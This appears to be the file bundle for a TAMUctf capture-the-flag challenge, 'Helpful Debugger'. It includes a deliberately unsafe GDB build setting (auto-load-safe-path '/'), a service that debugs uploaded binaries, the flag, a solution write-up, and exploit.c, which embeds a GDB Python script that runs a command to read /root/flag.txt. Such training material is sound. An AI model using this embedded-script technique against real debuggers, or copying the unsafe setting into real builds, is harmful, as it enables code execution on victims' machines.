{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{4u70-10aD_Un5aF3_p47h}\"\n",
    "Dockerfile": "FROM debian:buster-slim\n\nEXPOSE 5309\n\nRUN printf \"\\n\\\ndeb-src http://deb.debian.org/debian buster main\\n\\\ndeb-src http://security.debian.org/debian-security buster/updates main\\n\\\ndeb-src http://deb.debian.org/debian buster-updates main\" >> /etc/apt/sources.list\n\nRUN apt update && apt -y build-dep gdb && apt -y install curl tar libmpc-dev libbabeltrace-dev socat\n\nRUN mkdir -p /opt/gdb && cd /opt/gdb && \\\n    curl \"http://mirrors.kernel.org/sourceware/gdb/releases/gdb-10.1.tar.xz\" | tar xvJ\nRUN mkdir -p /opt/gdb/gdb-10.1/build && cd /opt/gdb/gdb-10.1/build && \\\n    ../configure \\\n        --host=x86_64-linux-gnu --target=x86_64-linux-gnu \\\n        --with-auto-load-dir=/ \\\n        --with-auto-load-safe-path=/ \\\n        --with-expat \\\n        --with-gdb-datadir=/usr/share/gdb \\\n        --with-jit-reader-dir=/usr/lib/gdb \\\n        --without-libunwind-ia64 \\\n        --with-lzma \\\n        --with-babeltrace \\\n        --without-intel-pt \\\n        --with-mpfr \\\n        --without-xxhash \\\n        --with-python=/usr \\\n        --without-guile \\\n        --disable-source-highlight \\\n        --with-separate-debug-dir=/usr/lib/debug \\\n        --with-system-gdbinit=/etc/gdb/gdbinit\n\nRUN cd /opt/gdb/gdb-10.1/build && \\\n    make -j$(nproc) && \\\n    strip /opt/gdb/gdb-10.1/build/gdb/gdb && \\\n    make install\n\nRUN rm -rf /opt/gdb\n\nCOPY runloop.sh /opt/runloop.sh\nRUN chmod +x /opt/runloop.sh\n\nCOPY flag.txt /root/flag.txt\n\nCMD exec socat -d -d tcp-l:5309,reuseaddr,fork exec:/opt/runloop.sh,stderr\n",
    "exploit.c": "asm(\n\".pushsection \\\".debug_gdb_scripts\\\", \\\"MS\\\",@progbits,1\\n\"\n\".byte 4\\n\"\n\".ascii \\\"gdb.inlined-script\\\\n\\\"\\n\"\n\".ascii \\\"import subprocess\\\\n\\\"\\n\"\n\".ascii \\\"subprocess.call(['cat', '/root/flag.txt'])\\\\n\\\"\\n\"\n\".byte 0\\n\"\n\".popsection\\n\"\n);\n",
    "flag.txt": "gigem{4u70-10aD_Un5aF3_p47h}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O2 -static -no-pie -fno-stack-protector\nCONTAINER := helpful-debugger\n\nall: gdb\n\nclean: .PHONY\n\trm -f gdb\n\ndocker: Dockerfile\n\tdocker build -t $(CONTAINER) .\n\nrun: docker\n\tdocker run --rm -ti --name helpful-debugger -p 5309:5309 helpful-debugger\n\ngdb: docker\n\t$(eval id := $(shell docker create $(CONTAINER)))\n\tdocker cp $(id):/usr/local/bin/gdb - | tar xv gdb\n\tdocker rm -v $(id)\n\n.PHONY:\n",
    "problem.json": "{\n  \"name\": \"Helpful Debugger\",\n  \"category\": \"Pwn\",\n  \"description\": \"Hey, go ahead and send that binary you were looking at over me and wait for the functions to come back. You should be able to use <a href='https://tamuctf.com/static-files/my-special-gdb'>my gdb</a>; I configured the build for gdb to better handle go binaries.\\n\\n<code>openssl s_client -connect tamuctf.com:443 -servername helpful-debugger -quiet</code>\",\n  \"score\" : 250,\n  \"hints\": [\"No source code modifications were made to this gdb build.\"],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Addison Crump\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "readme.md": "# Helpful Debugger\n\n## description\n\nHey, go ahead and send that binary you were looking at over me and wait for the functions to come back. You should be able to use my gdb; I configured the build for gdb to better handle go binaries.\n\n## solution\n\nDebug builds in Go embed a GDB extension in the binary to add features for working with Go programs, but debugging\nbinaries isn't something you generally want to execute arbitrary code on load so GDB restricts this a little bit. You\ncan list the configure args of GDB by executing `show configuration`.  If you do this, you'll notice\n\"--with-auto-load-safe-path=/\".  If the path is the \"/\" GDB will disable the security protection, allowing programs to\nexecute arbitrary python on loading. Our initial exploit is provided in [exploit.c](exploit.c), but we found that the\nthought process that [CyberErudites followed was much more enlightening](https://ctftime.org/writeup/27769). Check it\nout!\n\n",
    "runloop.sh": "#!/bin/bash\n\nset +e\n\necho \"Send me the length of your file, then just cat the file in after it\"\n\nread -r length\n\ncase $length in\n    ''|*[!0-9]*) echo \"Not a number; terminating\"; exit 1 ;;\n    *) echo \"Your file is ${length} bytes\" ;;\nesac\n\nif [ \"${length}\" -gt \"131072\" ]; then\n    echo \"File too long! Max size is 128KiB.\"\n    exit 1\nfi\n\ntemp=$(mktemp)\ndd of=\"$temp\" bs=1 count=\"${length}\" > \"$temp\"\ngdb --batch -ex \"info functions\" \"$temp\"\nrm \"$temp\"\n",
    "category": "pwn"
}